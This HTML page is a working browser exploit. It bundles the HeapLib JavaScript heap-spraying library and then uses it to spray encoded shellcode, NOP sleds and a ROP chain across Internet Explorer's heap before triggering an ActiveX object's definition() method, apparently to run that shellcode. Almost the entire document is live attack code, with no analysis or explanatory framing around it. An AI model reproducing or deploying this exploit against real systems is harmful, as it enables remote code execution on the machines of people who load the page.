    <html>
    <head>
    <script>
    //
//   JavaScript Heap Exploitation library
//   by Alexander Sotirov <asotirov@determina.com>
//  
//   Version 0.3
//
// Copyright (c) 2007, Alexander Sotirov
// All rights reserved.
// 
// The HeapLib library is licensed under a BSD license, the text of which follows:
// 
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions
// are met:
// 
// 1. Redistributions of source code must retain the above copyright
//    notice, this list of conditions and the following disclaimer.
// 2. Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
// 3. Neither the name of Alexander Sotirov nor the name of Determina Inc.
//    may be used to endorse or promote products derived from this software
//    without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.
//
 
//
// heapLib namespace
//

function heapLib() {
}


//
// heapLib class
//

// heapLib.ie constructor
//
// Creates a new heapLib API object for Internet Explorer. The maxAlloc
// argument sets the maximum block size that can be allocated using the alloc()
// function.
//
// Arguments:
//    maxAlloc - maximum allocation size in bytes (defaults to 65535)
//    heapBase - base of the default process heap (defaults to 0x150000)
//

heapLib.ie = function(maxAlloc, heapBase) {

    this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
    this.heapBase = (heapBase ? heapBase : 0x150000);

    // Allocate a padding string that uses maxAlloc bytes
    this.paddingStr = "AAAA";

    while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {
        this.paddingStr += this.paddingStr;
    }
    
    // Create an array for storing references to allocated memory
    this.mem = new Array();

    // Call flushOleaut32() once to allocate the maximum size blocks
    this.flushOleaut32();
}


//
// Outputs a debugging message in WinDbg. The msg argument must be a string
// literal. Using string concatenation to build the message will result in heap
// allocations.
//
// Arguments:
//    msg - string to output
//

heapLib.ie.prototype.debug = function(msg) {
    void(Math.atan2(0xbabe, msg));
}


//
// Enables or disables logging of heap operations in WinDbg.
//
// Arguments:
//    enable - a boolean value, set to true to enable heap logging
//

heapLib.ie.prototype.debugHeap = function(enable) {

    if (enable == true)
        void(Math.atan(0xbabe));
    else
        void(Math.asin(0xbabe));
}


//
// Triggers a breakpoint in the debugger.
//

heapLib.ie.prototype.debugBreak = function(msg) {
    void(Math.acos(0xbabe));
}


//
// Returns a string of a specified length, up to the maximum allocation size
// set in the heapLib.ie constructor. The string contains "A" characters.
//
// Arguments:
//    len - length in characters
//

heapLib.ie.prototype.padding = function(len) {
    if (len > this.paddingStr.length)
        throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";

    return this.paddingStr.substr(0, len);
}


//
// Returns a number rounded up to a specified value.
//
// Arguments:
//    num   - integer to round
//    round - value to round to
//

heapLib.ie.prototype.round = function(num, round) {
    if (round == 0)
        throw "Round argument cannot be 0";

    return parseInt((num + (round-1)) / round) * round;
}


//
// Converts an integer to a hex string. This function uses the heap.
//
// Arguments:
//    num   - integer to convert
//    width - pad the output with zeros to a specified width (optional)
//

heapLib.ie.prototype.hex = function(num, width)
{
    var digits = "0123456789ABCDEF";

    var hex = digits.substr(num & 0xF, 1);

    while (num > 0xF) {
        num = num >>> 4;
        hex = digits.substr(num & 0xF, 1) + hex;
    }

    var width = (width ? width : 0);

    while (hex.length < width)
        hex = "0" + hex;

    return hex;
}


//
// Convert a 32-bit address to a 4-byte string with the same representation in
// memory. This function uses the heap.
//
// Arguments:
//    addr - integer representation of the address
//

heapLib.ie.prototype.addr = function(addr) {
    return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
}


//
// Allocates a block of a specified size with the OLEAUT32 alloc function.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    // Create an array for this tag if doesn't already exist
    if (this.mem[tag] === undefined)
        this.mem[tag] = new Array();

    if (typeof arg == "string" || arg instanceof String) {
        // Allocate a new block with strdup of the string argument
        this.mem[tag].push(arg.substr(0, arg.length));
    }
    else {
        // Allocate the block
        this.mem[tag].push(this.padding((arg-6)/2));
    }
}


//
// Frees all memory blocks marked with a specific tag with the OLEAUT32 memory
// allocator.
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.freeOleaut32 = function(tag) {

    delete this.mem[tag];
    
    // Run the garbage collector
    CollectGarbage();
}


//
// The JScript interpreter uses the OLEAUT32 memory allocator for all string
// allocations. This allocator stores freed blocks in a cache and reuses them
// for later allocations. The cache consists of 4 bins, each storing up to 6
// blocks. Each bin holds blocks of a certain size range:
//
//    0 - 32
//    33 - 64
//    65 - 256
//    257 - 32768
//
// When a block is freed by the OLEAUT32 free function, it is stored in one of
// the bins. If the bin is full, the smallest block in the bin is freed with
// RtlFreeHeap() and is replaced with the new block. Chunks larger than 32768
// bytes are not cached and are freed directly.
//
// To flush the cache, we need to free 6 blocks of the maximum size for each
// bin. The maximum size blocks will push out all smaller blocks from the
// cache. Then we allocate the maximum size blocks again, leaving the cache
// empty.
//
// You need to call this function once to allocate the maximum size blocks
// before you can use it to flush the cache.
//

heapLib.ie.prototype.flushOleaut32 = function() {

    this.debug("Flushing the OLEAUT32 cache");

    // Free the maximum size blocks and push out all smaller blocks

    this.freeOleaut32("oleaut32");
    
    // Allocate the maximum sized blocks again, emptying the cache

    for (var i = 0; i < 6; i++) {
        this.allocOleaut32(32, "oleaut32");
        this.allocOleaut32(64, "oleaut32");
        this.allocOleaut32(256, "oleaut32");
        this.allocOleaut32(32768, "oleaut32");
    }
}


//
// Allocates a block of a specified size with the system memory allocator. A
// call to this function is equivalent to a call to HeapAlloc(). If the first
// argument is a number, it specifies the size of the new block, which is
// filled with "A" characters. If the argument is a string, its data is copied
// into a new block of size arg.length * 2 + 6. In both cases the size of the
// new block must be a multiple of 16 and not equal to 32, 64, 256 or 32768.
//
// Arguments:
//    arg - size of the memory block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.alloc = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if (size == 32 || size == 64 || size == 256 || size == 32768)
        throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";

    // Allocate the block with the OLEAUT32 allocator
    this.allocOleaut32(arg, tag);
}


//
// Frees all memory blocks marked with a specific tag with the system memory
// allocator. A call to this function is equivalent to a call to HeapFree().
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.free = function(tag) {

    // Free the blocks with the OLEAUT32 free function
    this.freeOleaut32(tag);

    // Flush the OLEAUT32 cache
    this.flushOleaut32();
}


//
// Runs the garbage collector and flushes the OLEAUT32 cache. Call this
// function before before using alloc() and free().
//

heapLib.ie.prototype.gc = function() {

    this.debug("Running the garbage collector");
    CollectGarbage();

    this.flushOleaut32();
}


//
// Adds blocks of the specified size to the free list and makes sure they are
// not coalesced. The heap must be defragmented before calling this function.
// If the size of the memory blocks is less than 1024, you have to make sure
// that the lookaside is full.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many free blocks to add to the list (defaults to 1)
//

heapLib.ie.prototype.freeList = function(arg, count) {

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++) {
        this.alloc(arg);
        this.alloc(arg, "freeList");
    }
    this.alloc(arg);

    this.free("freeList");
}


//
// Add blocks of the specified size to the lookaside. The lookaside must be
// empty before calling this function.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many blocks to add to the lookaside (defaults to 1)
//

heapLib.ie.prototype.lookaside = function(arg, count) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++)
        this.alloc(arg, "lookaside");

    this.free("lookaside");
}


//
// Return the address of the head of the lookaside linked list for blocks of a
// specified size. Uses the heapBase parameter from the heapLib.ie constructor.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//

heapLib.ie.prototype.lookasideAddr = function(arg)
{
    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    // The lookahead array starts at heapBase + 0x688. It contains a 48 byte
    // structure for each block size + header size in 8 byte increments.

    return this.heapBase + 0x688 + ((size+8)/8)*48;
}


//
// Returns a fake vtable that contains shellcode. The caller should free the
// vtable to the lookaside and use the address of the lookaside head as an
// object pointer. When the vtable is used, the address of the object must be
// in eax and the pointer to the vtable must be in ecx. Any virtual function
// call through the vtable from ecx+8 to ecx+0x80 will result in shellcode
// execution. This function uses the heap.
//
// Arguments:
//    shellcode - shellcode string
//    jmpecx    - address of a jmp ecx or equivalent instruction
//    size      - size of the vtable to generate (defaults to 1008 bytes)
//

heapLib.ie.prototype.vtable = function(shellcode, jmpecx, size) {

    var size = (size ? size : 1008);

    // Make sure the size is valid
    if ((size & 0xf) != 0)
        throw "Vtable size " + size + " must be a multiple of 16";

    if (shellcode.length*2 > size-138)
        throw("Maximum shellcode length is " + (size-138) + " bytes");

    // Build the fake vtable that will go on the lookaside list
    //
    // lookaside ptr  jmp +124  addr of jmp ecx  sub [eax], al*2  shellcode       null
    // 4 bytes        4 bytes   124 bytes        4 bytes          size-138 bytes  2 bytes

    var vtable = unescape("%u9090%u7ceb")   // nop, nop, jmp + 124

    for (var i = 0; i < 124/4; i++)
        vtable += this.addr(jmpecx);

    // If the vtable is the only entry on the lookaside, the first 4 bytes will
    // be 00 00 00 00, which disassembles as two add [eax], al instructions.
    // The jmp ecx trampoline will jump back to the beginning of the vtable and
    // execute the add [eax], al instructions. We need to use two sub [eax], al
    // instructions to fix the heap.

    vtable += unescape("%u0028%u0028") +    // two sub [eax], al instructions
              shellcode + heap.padding((size-138)/2 - shellcode.length);

    return vtable;
}


    var heap_obj = new heapLib.ie(0x20000);
    var code = unescape("%ub6fd%u102c%u1cd4%ub937%u3547%u1a75%ub5d6%u7f91%u7371%u7876%u4240%u98b3%ub4b6%u4aa8%u2435%u8846%u85d6%u71e1%u6670%u7a2c%u373d%u417f%u91ba%u80b9%uc0ff%u43eb%ub534%u7cb2%u7e4f%u7414%u1148%u2de2%u8da9%u497d%u277b%u9bb0%u1b96%u67f9%u3279%ub8d4%u150d%u7775%uf50a%u251c%u0590%u0cbb%u2f47%u99b7%u21bf%u69e3%u04d5%ufe08%ue0c1%u1d72%u83b1%u4bfc%u2b4e%u93fd%ube97%u923f%u289f%u7df8%u813c%u20e0%u02fc%u73e2%u4372%ud139%u30eb%u8df5%ub7be%u4bb0%ud38c%ue3d1%u272c%ub567%u2f1d%u4e42%u7e74%ud621%ub497%u767a%u480c%u9290%u78b2%u497f%u1c25%u9b3d%u4693%u1415%u77bf%u754f%u9147%u0da8%uf919%ufd18%uf801%u7170%u407c%ub698%u799f%ud569%u4ab3%ub124%ub837%u0566%ue183%u3534%u3996%ubbd4%u9904%u3c7b%uba41%u3f71%ua9b9%ue180%u7d78%ua82d%u0ab9%ubefc%u7973%u9f14%ub5b4%uf887%u6b72%u1dd5%ubf48%ud029%u66e0%u7cb8%ud428%u9b24%u4a77%u96bb%u3c91%u4f46%u7b47%u3741%ub1b2%ub74e%u7a34%u0d75%u3099%ub0f5%u8140%u67fd%u0c25%ub315%u4b97%u4292%u4993%u868d%u7fe3%ua927%uba04%u3d70%u3590%ue285%u7e3f%u2d2c%u091c%u03eb%u2fd6%u7698%u7405%ub643%uf931%u0b15%u7ff5%u7570%u1d78%ueb1a%u7347%u7177%u667d%u7e49%u1374%ub3d4%ud63b%u76b2%ue122%uba42%u7999%ub94b%u43b6%u0d72%u1cb1%uc132%u04e3%u8dbf%ubb37%uf838%ud512%u9193%u67b8%ue284%u347b%ub427%u237c%ua9fc%u9f97%uf602%uf9c0%ue011%u0525%u9046%u2b98%u41fd%u407a%u4892%u4f24%u3cb7%u4e77%u7079%ub52d%u7596%u722f%uf733%u35e2%ua89b%u3f76%u3a7f%u3de1%u4a7c%u2a7a%u2ce3%u0c78%ubeb0%u107e%u14e0%u7193%u8d47%ubab7%ub5b2%u744f%u3f3d%u2d7d%uf889%u271d%uebbf%u4a05%u4624%u0440%ua9b6%u3c4e%u7b43%ud21b%ub1d6%ub314%uf90d%ub867%u412c%u2073%u48d4%u2f98%ufc1c%ube9f%u91bb%u2515%u9297%u6649%ub996%u9ba8%u4290%u4b34%u08b4%ub0f5%u0c35%u3799%u88d5%ub8fd%u4520%u0fed%uc0dd%u74d9%uf424%u335b%ub1c9%u3173%u1243%ueb83%u03fc%u4b63%ufa0f%ubb9f%u0546%u3c5f%u8f39%u0dba%ueb6b%u3ccf%u7fbb%ucc9d%u2d30%u4635%ufa34%uef3a%udcf3%uf075%ue135%u32d9%u9d57%u6723%u9cb7%u7aec%ud9b6%u7410%ub2ea%u275f%ub61b%uf41d%u181a%u442a%u1d65%u31ec%u1cdf%ue93c%u5654%u81a4%u4733%u46d5%ubb20%ue39c%u4f93%u221f%ub0ea%u0a2e%u8ea1%u879f%ud7bb%u7827%u23ce%u0554%uf7c9%ud127%uea5c%u928f%ucec7%u762e%u8591%u333c%uc2d5%uc220%u793a%u4f5c%uaebd%u0bd5%u6a9a%uc8be%u2b83%ube1a%u2cbc%u1fc2%u2619%u74e0%u651b%ue56c%ue241%u916c%u63fe%u0802%u9288%ua28e%u2dc6%u3408%u0428%uc565%uf081%u6ed2%u9778%uc6e6%uc0fd%u32e9%u6e16%u8c4e%u3e20%u8421%u90b1%u3290%u41e6%uab42%uef51%uedfd%u3aa1%ubdea%uf404%u133e%uf6df%uf48c%ua59b%ua6a2%u1bf2%u2f12%uce1e%u94bc%u241f%u2c49%ud7b5%ud912%uebca%u19a4%ueb42%u1dce%u8604%u4811%u23cc%uea6b%u338a%u23a6%u9c6c%u131f%u75c5%ub6f7%u61ef%u367c%u143a%ubd42%u5cea%uba4d%u6279%uc251%ub26a%u5fb8%u356c%u883a%ucac1%ub7c5%u4435%u674f%u893f%u59c3%ubdcf%u996b%u565c%u92e4%uc9c4%u2988%u2b64%ua101%u3e0e%u45b5%uab04%u8674%u7c85%u041c%u7f50%u62b0%u15a6%u2432%u33ce%u10c4%u3b41%u36fd%u036f%u809b%u8094%u354a%u0bc0%u91c0%u22e1%u6d18%u14f2%ud8c9%u869d%u6d7f%u58bf%uebaa%ud380%uac79%udc85%u5af5%udcec%u32a1%u987d%ubf6d%u722d%u9205%uda9a%u138e%ua0f1%ue8dc%u6811%u994f%ue323%u0be8%ud953%uab9c%u8afc%u2751%ucc6d%ue26e%ud218%uedf8%uf8c0%u12f2%u142f%u1292%u1a2f%u9fff%u90a8%u71ce%u232c%u8e55%u2a46%u716b%ua769%uefe0%u41e5%u9368%udb27%u351a%u1b57");
    var nops = unescape("%u0c0c%u0c0c");
    var nops_90 = unescape("%u1c48%u99b5");
    var rop_chain = unescape("%uec01%u77c4%uec00%u77c4%u5ed5%u77c1%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%ub860%u77c3%uffff%uffff%ube18%u77c1%u649e%u9b8b%u362c%u77c2%ud9bb%u77c5%ue071%u77c2%u0d13%u77c5%uffc0%uffff%u8fbc%u77c5%ube18%u77c1%u91b0%ue863%u8fbc%u77c5%uee15%u77c3%uee15%u77c3%ueeef%u77c3%ud9bb%u77c5%ua88c%u77c2%u9f92%u77c3%ua184%u77c3%uaacc%u77c2%ub860%u77c3%u1120%u77c1%u2df9%u77c1%u5459%u77c3");

    while (nops.length < 0x80000) nops += nops;
    while (nops_90.length < 0x80000) nops_90 += nops_90;

    var offset = nops.substring(0, 0x0);
    var nops_padding = nops.substring(0, 0x5f4-code.length-offset.length);
    var shellcode = offset + code + nops_padding + rop_chain + nops_90.substring(0, 0x800-code.length-nops_padding.length-rop_chain.length);


    while (shellcode.length < 0x40000) shellcode += shellcode;
    var block = shellcode.substring(0, (0x80000-6)/2);


    heap_obj.gc();
    for (var z=1; z < 0x230; z++) {
      heap_obj.alloc(block);
    }


    </script>
    </head>
    <body>
    <object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id="pZBS"></object>
    <script>
    var obj = document.getElementById('pZBS').object;
    var src = unescape("%u0c08%u0c0c");
    while (src.length < 0x1002) src += src;
    src = "\\\\xxx" + src;
    src = src.substr(0, 0x1000 - 10);
    var pic = document.createElement("img");
    pic.src = src;
    pic.nameProp;
    obj.definition(453);
    </script>
    </body>
    </html>
